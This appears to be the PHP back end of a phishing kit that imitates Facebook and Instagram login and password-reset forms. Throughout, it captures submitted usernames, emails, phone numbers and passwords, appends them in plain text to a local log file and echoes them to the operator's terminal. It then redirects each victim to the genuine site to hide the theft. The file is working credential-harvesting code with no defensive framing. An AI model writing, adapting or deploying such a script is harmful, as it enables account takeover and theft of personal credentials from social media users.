<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // FORGOT PASSWORD HANDLER
    if (isset($_POST['user_input']) && empty($_POST['username']) && empty($_POST['email'])) {
        $input = trim($_POST['user_input']);
        $label = "UNKNOWN";

        // Identify the type
        if (filter_var($input, FILTER_VALIDATE_EMAIL)) {
            $label = "Email";
        } elseif (preg_match("/^\d{7,15}$/", $input)) {
            $label = "Phone";
        } else {
            $label = "Username";
        }

        // Terminal colored log
        $header = "\033[36m==== [FORGOT PASSWORD] ====\033[0m\n";
        $log = "$label: $input\n";
        $log .= "Time: " . date("Y-m-d H:i:s") . "\n";
        $log .= "=============================\n\n";

        // Save to file
        file_put_contents("login.txt", strip_tags($header . $log), FILE_APPEND);

        if (php_sapi_name() === 'cli') {
            echo $header . $log;
        }

        header("Location: https://www.instagram.com/accounts/password/reset/");
        exit();
    }

    // LOGIN HANDLER
    $user = $_POST['username'] ?? $_POST['email'] ?? 'UNKNOWN_USER';
    $pass = $_POST['password'] ?? $_POST['pass'] ?? 'UNKNOWN_PASS';
    $platform = isset($_POST['email']) ? "Facebook" : "Instagram";

    $header = $platform === "Facebook"
        ? "\033[34m==== [Facebook Login] ====\033[0m\n"
        : "\033[35m==== [Instagram Login] ====\033[0m\n";

    $log = "Username: $user\nPassword: $pass\n";
    $log .= "Time: " . date("Y-m-d H:i:s") . "\n";
    $log .= "===========================\n\n";

    file_put_contents("login.txt", strip_tags($header . $log), FILE_APPEND);

    if (php_sapi_name() === 'cli') {
        echo $header . $log;
    }

    if ($platform === "Facebook") {
        header("Location: https://m.facebook.com/login");
    } else {
        header("Location: https://www.instagram.com/accounts/login/?hl=en");
    }

    exit();
}
?>
